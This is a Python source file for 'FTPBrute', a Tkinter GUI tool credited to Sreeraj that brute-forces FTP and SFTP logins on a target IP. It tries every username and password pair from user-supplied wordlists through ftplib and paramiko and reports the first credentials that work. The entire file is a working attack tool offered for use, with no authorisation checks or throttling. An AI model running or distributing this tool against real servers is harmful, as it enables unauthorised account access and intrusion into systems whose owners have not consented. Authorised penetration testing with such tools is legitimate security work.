# copyright © Sreeraj, 2024
# https://github.com/s-r-e-e-r-a-j

import ftplib
import paramiko
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
from tkinter import ttk
import threading
import itertools

class FTPBruteForceTool:
    def __init__(self, root):
        self.root = root
        self.root.title("FTPBrute - FTP Brute Force Tool")
        self.root.geometry("550x650")
        self.root.config(bg="#2e2e2e")  # Dark background color
        self.is_running = False

        # Configure styles
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TLabel", background="#2e2e2e", foreground="#ffffff", font=("Arial", 10))
        style.configure("TButton", background="#4a90e2", foreground="#ffffff", font=("Arial", 10))
        style.configure("Header.TLabel", font=("Arial", 20, "bold"), foreground="#4a90e2")
        style.configure("Copyright.TLabel", font=("Arial", 9, "italic"), foreground="#9e9e9e")

        # Header
        tool_name_label = ttk.Label(root, text="FTPBrute", style="Header.TLabel")
        tool_name_label.pack(pady=10)

        # Copyright notice
        copyright_label = ttk.Label(root, text="This tool is made by Sreeraj", style="Copyright.TLabel")
        copyright_label.pack(pady=5)

        # Target IP entry
        ttk.Label(root, text="Target FTP/SFTP IP Address:").pack(pady=5)
        self.target_entry = ttk.Entry(root, width=50)
        self.target_entry.pack(pady=5)

        # Protocol selection (FTP/SFTP)
        ttk.Label(root, text="Select Protocol:").pack(pady=5)
        self.protocol = tk.StringVar(value="FTP")  # Default to FTP
        ftp_radio = ttk.Radiobutton(root, text="FTP", variable=self.protocol, value="FTP")
        ftp_radio.pack()
        sftp_radio = ttk.Radiobutton(root, text="SFTP", variable=self.protocol, value="SFTP")
        sftp_radio.pack()

        # Username wordlist
        ttk.Label(root, text="Username Wordlist:").pack(pady=5)
        self.username_file = tk.StringVar()
        self.username_btn = ttk.Button(root, text="Select Username Wordlist", command=self.load_username_file)
        self.username_btn.pack(pady=5)

        # Password wordlist
        ttk.Label(root, text="Password Wordlist:").pack(pady=5)
        self.password_file = tk.StringVar()
        self.password_btn = ttk.Button(root, text="Select Password Wordlist", command=self.load_password_file)
        self.password_btn.pack(pady=5)

        # Output area
        self.output_area = scrolledtext.ScrolledText(root, width=60, height=12, state='disabled', bg="#1e1e1e", fg="#b0b0b0", font=("Courier", 10))
        self.output_area.pack(pady=10)

        # Start and Stop buttons
        self.button_frame = tk.Frame(root, bg="#2e2e2e")
        self.button_frame.pack(pady=10)
        self.start_btn = ttk.Button(self.button_frame, text="Start Brute Force", command=self.start_bruteforce)
        self.start_btn.grid(row=0, column=0, padx=10)
        self.stop_btn = ttk.Button(self.button_frame, text="Stop Brute Force", command=self.stop_bruteforce, state='disabled')
        self.stop_btn.grid(row=0, column=1, padx=10)

    def load_username_file(self):
        """Load the username wordlist file."""
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.username_file.set(file_path)
            self.username_btn.config(text=f"Selected: {file_path.split('/')[-1]}")

    def load_password_file(self):
        """Load the password wordlist file."""
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.password_file.set(file_path)
            self.password_btn.config(text=f"Selected: {file_path.split('/')[-1]}")

    def start_bruteforce(self):
        """Start the brute force attack in a separate thread."""
        target_ip = self.target_entry.get()
        username_file = self.username_file.get()
        password_file = self.password_file.get()
        protocol = self.protocol.get()

        if not target_ip or not username_file or not password_file:
            messagebox.showwarning("Input Error", "Please fill all fields and select both wordlists.")
            return

        self.is_running = True
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')

        # Run brute-force in a separate thread
        threading.Thread(target=self.bruteforce_attempt, args=(target_ip, username_file, password_file, protocol)).start()

    def bruteforce_attempt(self, target_ip, username_file, password_file, protocol):
        """Perform brute force attack."""
        try:
            with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
                usernames = [line.strip() for line in uf.readlines()]
                passwords = [line.strip() for line in pf.readlines()]

            self.output_area.config(state='normal')
            self.output_area.delete(1.0, tk.END)
            self.output_area.insert(tk.END, f"Starting brute force on {target_ip}...\n")
            self.output_area.config(state='disabled')

            for username, password in itertools.product(usernames, passwords):
                if not self.is_running:
                    self.output_area.config(state='normal')
                    self.output_area.insert(tk.END, "Brute force stopped.\n")
                    self.output_area.config(state='disabled')
                    break

                self.output_area.config(state='normal')
                self.output_area.insert(tk.END, f"Trying {username}:{password}\n")
                self.output_area.config(state='disabled')
                self.output_area.yview(tk.END)
                self.root.update()

                # Attempt FTP or SFTP login based on the selected protocol
                if protocol == "FTP":
                    if self.attempt_ftp_login(target_ip, username, password):
                        self.output_area.config(state='normal')
                        self.output_area.insert(tk.END, f"[SUCCESS] Username: {username}, Password: {password}\n")
                        self.output_area.config(state='disabled')
                        break
                elif protocol == "SFTP":
                    if self.attempt_sftp_login(target_ip, username, password):
                        self.output_area.config(state='normal')
                        self.output_area.insert(tk.END, f"[SUCCESS] Username: {username}, Password: {password}\n")
                        self.output_area.config(state='disabled')
                        break

            self.output_area.config(state='normal')
            self.output_area.insert(tk.END, "Brute force completed.\n")
            self.output_area.config(state='disabled')

        except Exception as e:
            messagebox.showerror("File Error", f"Error reading wordlist files: {e}")

        finally:
            self.is_running = False
            self.start_btn.config(state='normal')
            self.stop_btn.config(state='disabled')

    def attempt_ftp_login(self, target_ip, username, password):
        """Attempt FTP login with given credentials."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(target_ip, 21, timeout=10)  # Connect with a timeout of 10 seconds
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            # Login failed, continue trying
            return False
        except Exception as e:
            self.output_area.config(state='normal')
            self.output_area.insert(tk.END, f"Connection error: {e}\n")
            self.output_area.config(state='disabled')
            return False

    def attempt_sftp_login(self, target_ip, username, password):
        """Attempt SFTP login with given credentials."""
        try:
            transport = paramiko.Transport((target_ip, 22))  # Connect to the provided target IP and port
            transport.connect(username=username, password=password)
            transport.close()
            return True
        except paramiko.AuthenticationException:
            # Authentication failed, continue trying
            return False
        except Exception as e:
            self.output_area.config(state='normal')
            self.output_area.insert(tk.END, f"SFTP connection error: {e}\n")
            self.output_area.config(state='disabled')
            return False

    def stop_bruteforce(self):
        """Stop the brute force attack."""
        self.is_running = False
        self.stop_btn.config(state='disabled')

# Run the GUI application
if __name__ == "__main__":
    root = tk.Tk()
    app = FTPBruteForceTool(root)
    root.mainloop()
